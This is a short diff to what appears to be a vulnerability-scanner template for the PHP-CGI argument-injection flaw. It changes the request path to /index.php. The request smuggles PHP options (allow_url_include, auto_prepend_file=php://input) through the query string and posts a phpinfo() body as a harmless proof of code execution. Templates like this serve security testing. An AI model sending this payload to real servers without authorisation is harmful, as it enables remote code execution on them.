@@ -14,7 +14,7 @@ info:
 requests:
   - method: POST
     path:
-      - "{{BaseURL}}?-d+allow_url_include=On+-d+auto_prepend_file=php://input"
+      - "{{BaseURL}}/index.php?-d+allow_url_include=On+-d+auto_prepend_file=php://input"
     headers:
       Content-Type: "application/x-www-form-urlencoded"
     body: "<?php phpinfo(); ?>"
